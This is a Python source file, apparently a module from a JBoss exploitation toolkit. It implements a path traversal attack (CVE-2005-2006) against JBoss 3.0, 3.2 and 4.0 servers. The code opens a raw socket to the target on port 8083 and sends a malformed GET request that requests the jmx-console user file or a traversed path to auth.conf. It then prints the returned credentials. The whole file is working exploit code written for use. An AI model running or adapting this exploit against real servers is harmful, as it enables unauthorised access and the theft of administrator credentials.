from auxiliary import Auxiliary
from log import LOG
import socket
import utility

class Auxiliary:

    def __init__(self):
        self.name = 'JBoss Path Traversal (CVE-2005-2006)'
        self.versions = ['3.0', '3.2', '4.0']
        self.show = False
        self.flag = 'jb-fetch'

    def check(self, fingerprint):
        """
        """

        if fingerprint.version in self.versions:
            return True
        return False

    def _getPath(self, version):
        """ Return the traversal path based on the version.  I haven't figured out
        how to traverse just yet in 3.0/4.0.2, but it should be possible.
        """

        if version in ["3.0", "4.0"]:
            utility.Msg("Version %s is not vulnerable to credential retrieval"
                        ", but is vulnerable to path disclosure" % version, 
                        LOG.UPDATE)
            return ".\\\..\\\client\\\\auth.conf"
        elif version in ["3.2"]:
            return "jmx-console-users.properties"

    def run(self, fingerengine, fingerprint):
        """ Fetch the credentials, or at least attempt to.  We use raw
        sockets here because Requests doesn't allow us to submit malformed
        URLs.
        """

        utility.Msg("Attempting to retrieve jmx-console credentials...")

        request = "GET %{0} HTTP/1.0\r\n".format(self._getPath(fingerprint.version))

        try:
            sock = socket.socket()
            sock.connect((fingerengine.options.ip, 8083))
            sock.send(request)

            # weirdness in how jboss responds with data 
            tick = 0
            while tick < 5:

                data = sock.recv(2048)
                if '200 OK' in data:
                    
                    data = data.split('\n')
                    for entry in data[5:]:
                        if len(entry) <= 1:
                            continue

                        utility.Msg('  %s' % entry, LOG.SUCCESS)
                    break

                elif '400' in data:
                    utility.Msg("  %s" % data.split(' ')[2], LOG.SUCCESS)
                    break

                else:
                    tick += 1

        except Exception, e:
            utility.Msg("Failed: %s" % e, LOG.ERROR)
